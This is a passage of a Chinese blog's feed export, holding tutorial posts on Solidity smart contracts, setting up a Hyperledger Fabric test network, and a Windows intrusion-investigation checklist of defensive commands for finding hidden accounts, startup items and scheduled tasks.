class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给长城杯半决赛线下的jar包创碎很久之后想起来要学这个了，这篇文章基本上可以算是全抄参考文章的了&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/82174079/&quot;&gt;https://natro92.fun/posts/82174079/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWD" scheme="http://c1oudfl0w0.github.io/blog/categories/AWD/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>智能合约</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</id>
    <published>2024-06-16T15:39:13.000Z</published>
    <updated>2024-06-18T17:26:24.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p>《区块链技术与实践》—— 机械工业出版社</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></p><p><a href="https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md">https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md</a></p><span id="more"></span><hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>一种在区块链上存储的、无须中介、自我验证、自动执行合约条款的计算机交易协议。一旦协议参与方达到执行协议的条件，计算机或计算机网络便会自动执行协议并输出相应的结果</p></blockquote><p>例如：打麻将，这种活动无需参与方之外的力量参与就能按照规则自动进行，什么时候判定胜利，什么时候结束牌局，这些都是规则自己需要考虑的（</p><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>合约模型（自底向上）：基础设施层、合约层、运维层、智能层、表现层和应用层</p><ul><li>基础设施层：封装了分布式账本、共识机制、激励机制、开发环境等基础设施</li><li>合约层：封装了静态的合约数据，包括合约各方达成一致的合约文本、合约代码、符合情景的响应规则和合约创建者指定的合约与外界以及合约之间的交互准则</li><li>运维层：封装了一系列对合约层中静态合约数据的动态操作</li><li>智能层：封装各类智能算法</li><li>表现层：封装了智能合约在实际运用中的各类具体表现形式</li><li>应用层：封装了智能合约及其表现形式的具体应用领域</li></ul><h2 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h2><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617001154780.png" alt="image-20240617001154780"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>脚本型智能合约：比特币</p><p>图灵完备型智能合约：以太坊和 Hyperledger Fabric 中的智能合约，图灵完备是指能用编程语言模拟任何图灵机，以太坊主要使用 Solidity 和 Serpent 两种智能合约开发语言</p><p>可验证合约型智能合约：Kadena中的智能合约</p><h2 id="技术特征"><a href="#技术特征" class="headerlink" title="技术特征"></a>技术特征</h2><p>去信任化</p><p>自动性</p><p>防篡改</p><p>可追溯</p><hr><h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><p>以 Solidity 为例</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleStorage</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> storedData<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token builtin">uint</span> x<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        storedData <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> storedData<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行代码：告诉大家源代码使用Solidity版本0.4.0写的（运行版本 &lt; 0.5.0）。这是为了确保合约不会在新的编译器版本中突然行为异常。</p><p><code>pragma</code> ：告知编译器如何处理源代码的指令的（例如，C&#x2F;C++中的 <a href="https://zh.wikipedia.org/wiki/Pragma_once">pragma once</a> ，让所在的文件在一个单独的编译中只被包含一次，类似于php中的<code>include_once</code>）</p><p>Solidity中合约的含义就是一组代码（它的 <em>函数</em> ）和数据（它的 <em>状态</em> ），它们位于以太坊区块链的一个特定地址上。 </p><p><code>uint storedData</code> ：声明一个类型为 <code>uint</code> （256位无符号整数）的状态变量，叫做 <code>storedData</code> 。 可以认为它是数据库里的一个位置，可以通过调用管理数据库代码的函数进行查询和变更。</p><p>对于以太坊来说，上述的合约就是<strong>拥有合约</strong>（owning contract）。在这种情况下，函数 <code>set</code> 和 <code>get</code> 可以用来<strong>变更</strong>或<strong>取出</strong>变量的值。</p><hr><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>参考：<a href="https://juejin.cn/post/7046041881913851912">https://juejin.cn/post/7046041881913851912</a></p><p>在线IDE：<a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p><p>对应的文档：<a href="https://remix-ide.readthedocs.io/zh-cn/latest/">https://remix-ide.readthedocs.io/zh-cn/latest/</a></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">>=</span><span class="token version number">0.6.12</span> <span class="token operator">&lt;</span><span class="token version number">0.9.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * @dev Prints Hello World string     */</span>    <span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617004945038.png" alt="image-20240617004945038"></p><p>然后部署合约，deploy即可</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005633381.png" alt="image-20240617005633381"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005837792.png" alt="image-20240617005837792"></p><p>此时就成功部署了</p><p>这是对应的选项：</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005709992.png" alt="image-20240617005709992"></p><p>然后我们打开刚才部署成功的合约地址，点击执行print函数</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617010109205.png" alt="image-20240617010109205"></p><p>成功输出hello world</p><hr><h2 id="子货币"><a href="#子货币" class="headerlink" title="子货币"></a>子货币</h2><p>下面的合约实现了一个最简单的加密货币：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.26</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Coin</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 关键字“public”让这些变量可以从外部读取</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> minter<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token comment">// 轻客户端可以通过事件针对变化作出高效的反应</span>    <span class="token keyword">event</span> <span class="token function">Sent</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 这是构造函数，只有当合约创建时运行</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        minter <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> minter<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;</span> amount<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Sent</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，只有创建合约的人才能使货币无中生有，任何人都可以给其他人转币，不需要注册用户名和密码，所需要的只是以太坊密钥对</p><p><code>address public minter</code>：这一行声明了一个可以被公开访问的 <code>address</code> 类型的状态变量。 <code>address</code> 类型是一个160位的值，且不允许任何算数操作，这种类型适合存储合约地址或外部人员的密钥对</p><p><code>public</code>：自动生成一个函数，允许你在这个合约之外访问这个状态变量的当前值，如果没有这个关键字，其他的合约则没有办法访问这个变量</p><p><code>mapping (address =&gt; uint) public balances</code>：创建一个公共状态变量，该类型将address映射为无符号整数</p><p><code>event Sent(address from, address to, uint amount)</code>：声明了一个所谓的” 事件（event）”，它会在 <code>send</code> 函数的最后一行被发出，其中所有的事件都包含了 <code>from</code> ， <code>to</code> 和 <code>amount</code> 三个参数</p><p>特殊函数 <code>Coin</code> 是在创建合约期间运行的构造函数，不能在事后调用。 它永久存储创建合约的人的地址: <code>msg</code> ，这里是全局变量，其中包含一些允许访问区块链的属性。 <code>msg.sender</code> 始终是当前（外部）函数调用的来源地址。</p><p>最后，真正被用户或其他合约所调用的，以完成本合约功能的方法是 <code>mint</code> 和 <code>send</code>。 如果 <code>mint</code> 被合约创建者外的其他人调用则什么也不会发生。 另一方面， <code>send</code> 函数可被任何人用于向他人发送币 （当然，前提是发送者拥有这些币）</p><p>测试：</p><p>给两个节点设置币</p><p>传入参数<code>receiver: 0x1234567890123456789012345678901234567890</code>和<code>amount: 1</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013407385.png" alt="image-20240617013407385"></p><p><code>receiver: 0x1234567890123456789012345678901234567891</code>和<code>amount: 256</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013501643.png" alt="image-20240617013501643"></p><p>现在给<code>0x1234567890123456789012345678901234567891</code>发送2个币（我们是minter <code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>，我这里已经设置了有448个币）</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014213176.png" alt="image-20240617014213176"></p><p>balances 分别看一下<code>0x1234567890123456789012345678901234567891</code>和<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014250726.png" alt="image-20240617014250726"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014305217.png" alt="image-20240617014305217"></p><p>可以看到前者多了2个币，后者少了2个币</p><p>那么，如果我们往<code>0x1234567890123456789012345678901234567891</code>节点添加了超过446个币会发生什么？</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014446510.png" alt="image-20240617014446510"></p><p>此时不会有输出，即执行失败</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;《区块链技术与实践》—— 机械工业出版社&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&quot;&gt;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&quot;&gt;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>fabric搭建</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/</id>
    <published>2024-06-13T17:01:40.000Z</published>
    <updated>2024-06-18T17:27:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/393805594">https://zhuanlan.zhihu.com/p/393805594</a></p><p>《区块链技术与实践》—— 机械工业出版社</p><span id="more"></span><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows 11</p><p>Docker Desktop v4.20.1</p><p>Git Bash</p><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>官方文档：<a href="https://hyperledger-fabric.readthedocs.io/zh-cn/latest/">https://hyperledger-fabric.readthedocs.io/zh-cn/latest/</a></p><ol><li><p>建立 fabric 工作目录，github上下载sample源码：<a href="https://github.com/hyperledger/fabric-samples">https://github.com/hyperledger/fabric-samples</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/hyperledger/fabric-samples.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>下载 fabric release 二进制文件：<a href="https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz">https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz</a></p><p>解压缩后复制 bin 和 config 到 sample 文件夹</p></li><li><p>下载docker镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull hyperledger/fabric-baseos:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-orderer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-peer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-couchdb:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-ca:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用git bash，执行 sample 文件夹中的 test-network 中的 network.sh 文件，建立测试网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> network.sh up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/image-20240614011433468.png" alt="image-20240614011433468"></p><p>此时可以看到，测试网络建立了2个peer，一个orderer</p></li></ol><hr><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="Peer节点"><a href="#Peer节点" class="headerlink" title="Peer节点"></a>Peer节点</h2><p>Peer节点是一个物理概念，是网络上负责维护账本状态并管理链码的节点</p><p>作为账本和链码的载体，存储包括账本、链码在内的关键数据，并且执行例如背书、链码等特定的程序</p><p>所有的账本查询以及账本修改必须通过链码来操作，所有的链码操作必须通过Peer节点唤起</p><p>即提供了用户与系统交互的接口</p><hr><h2 id="Orderer排序节点"><a href="#Orderer排序节点" class="headerlink" title="Orderer排序节点"></a>Orderer排序节点</h2><p>Orderer节点是共识服务的网络节点，负责接收交易、产生区块，并且对共识机制的策略进行管理</p><hr><h2 id="Chaincode"><a href="#Chaincode" class="headerlink" title="Chaincode"></a>Chaincode</h2><p>链上代码，即智能合约，简称为链码</p><p>一般用go编写，是分布式账本的状态处理逻辑，主要用于执行交易和访问状态数据</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/393805594&quot;&gt;https://zhuanlan.zhihu.com/p/393805594&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;《区块链技术与实践》—— 机械工业出版社&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>windows入侵排查</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</id>
    <published>2024-06-04T08:54:58.000Z</published>
    <updated>2024-06-11T16:53:19.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://www.cnblogs.com/Zerimon/p/16371479.html">https://www.cnblogs.com/Zerimon/p/16371479.html</a></p><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><span id="more"></span><hr><h1 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h1><p>若只是简单了解系统信息，可通过在命令行中输入<code>systeminfo</code>命令实现</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604165805977.png" alt="image-20240604165805977"></p><h2 id="msinfo32"><a href="#msinfo32" class="headerlink" title="msinfo32"></a>msinfo32</h2><blockquote><p>在基础排查时，可以使用 Microsoft 系统信息工具<code>Msinfo32.exe</code>，它是 Microsoft Windows NT诊断工具（Winmsd.exe）的更新版本</p></blockquote><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604165655083.png" alt="image-20240604165655083"></p><p>此处可以显示出本地计算机的硬件资源、组件和软件环境的信息</p><p>以下是软件环境的内容：</p><ul><li><p>正在运行任务：正在运行任务的名称、路径、进程ID等</p></li><li><p>服务：服务的名称、状态、路径等</p></li><li><p>系统驱动程序：系统驱动程序的名称、描述、文件等</p></li><li><p>加载的模块：加载的模块的名称、路径等</p></li><li><p>启动程序：启动程序的命令、用户名、位置等</p></li></ul><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p><strong>命令行查看</strong>：</p> <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user<span class="token comment"># 直接收集用户账户信息（注意，此方法看不到以$结尾的隐藏账户）</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170552039.png" alt="image-20240604170552039"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user username<span class="token comment"># 查看某个账户的详细信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170640655.png" alt="image-20240604170640655"></p><p><strong>图形化查看</strong>：</p><p>打开【计算机管理】窗口，单击【本地用户和组】中的【用户】选项，可查看隐藏账户，名称以<code>$</code>结尾的为隐藏账户</p><p>或者在命令行输入下列命令</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">lusrmgr<span class="token punctuation">.</span>msc<span class="token comment"># 直接打开图形界面，查看是否有新增/可疑的账户</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170819074.png" alt="image-20240604170819074"></p><p><strong>注册表查看：</strong></p><p>打开【注册表编辑器】窗口（<code>win + R</code>输入<code>regedit</code>打开），选择【HKEY_LOCAL_MACHINE】下的【SAM】选项，为该项添加【允许父项的继承权限传播到该对象和所有子对象。包括那些在此明确定义的项目】和【用在此显示的可以应用到子对象的项目替代所有子对象的权限项目】权限，使当前用户拥有SAM的读取权限；</p><p>添加权限完成后按【F5】键，刷新后即可访问子项并查看用户信息；</p><p>在此项下导出所有以 00000 开头的项，将所有导出的项与 000001F4（该项对应Administrator用户）导出内容做比较，若其中的F值相同，则表示系统中存在克隆账户（图直接从参考文章取的）</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171227341.png" alt="image-20240604171227341"></p><p><strong>wmic</strong>：</p><blockquote><p>wmic 扩展 WMI（Windows Management Instrumentation，Windows管理工具），提供从命令行接口和批命令脚本执行系统管理支持</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wmic useraccount get name<span class="token punctuation">,</span> SID<span class="token comment"># 可以查看系统中的用户信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><strong>通过【系统配置】对话框查看</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开Windows系统中的【系统配置】对话框，单击【启动】选项卡，可查看启动项的详细信息</p><p><strong>通过注册表查看</strong>：</p><blockquote><p>注册表是操作系统中一个重要的数据库，主要用于存储系统所必需的信息。注册表以分层的组织形式存储数据元素。数据项是注册表的基本元素，每个数据项下面不但可以存储很多子数据项，还可以以键值对的形式存储数据。</p></blockquote><p>目录含义：</p><ol><li><code>HKEY_CLASSES_ROOT</code>（HKCR）<br>此处存储的信息可确保在Windows资源管理器中执行时打开正确的程序。<br>它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息。</li><li><code>HKEY_CURRENT_USER</code>（HKCU）<br>包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置。</li><li><code>HKEY_LOCAL_MACHINE</code>（HKLM）<br>包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置。</li><li><code>HKEY_USERS</code>（HKU）<br>包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置。</li><li><code>HKEY_CURRENT_CONFIG</code>（HCU）<br>存储有关系统当前配置的信息。</li></ol><hr><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><blockquote><p>任务计划是Windows系统的一个预置实现某些操作的功能，利用这个功能还可实现自启动的目的</p></blockquote><p>获取方法：</p><ol><li><p>打开【计算机管理】窗口，选择【系统工具】中【任务计划程序】中的【任务计划程序库】选项，可以查看任务计划的名称、状态、触发器等详细信息；</p></li><li><p>在PowerShell下输入<code>Get-ScheduledTask</code>命令，可查看当前系统中所有任务计划的信息，包括任务计划的路径、名称、状态等详细信息；</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171802384.png" alt="image-20240604171802384"></p></li><li><p>在命令行中输入<code>schtasks</code>命令，可获取任务计划的信息。该命令是一个功能更为强大的超级命令行计划工具，它含有【at】（在较旧的系统中才可以用）命令行工具中的所有功能，获取任务计划时要求必须是本地 Administrators 组的成员。</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171844807.png" alt="image-20240604171844807"></p></li></ol><hr><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><blockquote><p>Windows系统防火墙最基本的用途是对出、入的数据包进行检测</p></blockquote><p>防火墙规则包括入站规则和出站规则。</p><ul><li>入站规则：根据规则中的过滤条件，过滤从公网到本地主机的流量。</li><li>出站规则：根据规则中的过滤条件，过滤从本地主机到公网的流量。</li></ul><p>两种规则都可以按需自定义流量过滤的条件。</p><p>换句话说，入站规则与进入主机的流量有关，如果在主机上运行一个Web服务器，那就必须告诉防火墙允许外部用户访问主机。</p><p>出站规则与流出主机的流量有关，会将应用程序分类，允许部分应用程序访问外网，而其他应用则不能。</p><p>查看：</p><ul><li><p>打开【Windows防火墙】窗口，单击【高级设置】，然后选择【入站规则】或【出站规则】可查看防火墙的入站规则或出站规则。</p></li><li><p>在命令行中输入<code>netsh</code>命令进行查看</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604172427001.png" alt="image-20240604172427001"></p></li></ul><hr><h1 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h1><p>常见的应急响应事件分类：</p><p>Web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><h2 id="检查系统账号安全"><a href="#检查系统账号安全" class="headerlink" title="检查系统账号安全"></a>检查系统账号安全</h2><ol><li><p>查看服务器是否有弱口令，远程管理端口是否对公网开放：根据实际情况咨询管理员</p></li><li><p>查看服务器是否存在可疑账号、新增账号、隐藏账号、克隆账号。（可看到以<code>$</code>结尾的隐藏账户）：</p><ul><li><code>lusrmgr.msc</code> &#x2F; <code>compmgmt.msc</code>查看是否有新增&#x2F;可疑的账号，如有管理员群组的（Administrators）里的新增账户，立刻删除或禁用</li><li>检查目录<code>c:\users</code>即可看到创建用户，用户登录后会在该目录创建⼀个以用户名命名的文件夹，当安全日志被删、或者用户已经被删除可以通过该文件夹的创建时间来大致判断用户被创建时间和登录时间。</li></ul></li><li><p>查看服务器是否存在隐藏账号、克隆账号</p><ul><li><p>打开注册表 ，查看管理员对应键值</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604174928652.png" alt="image-20240604174928652"></p></li><li><p>使用D盾_web查杀工具，集成了对克隆账号检测的功能</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604174812558.png" 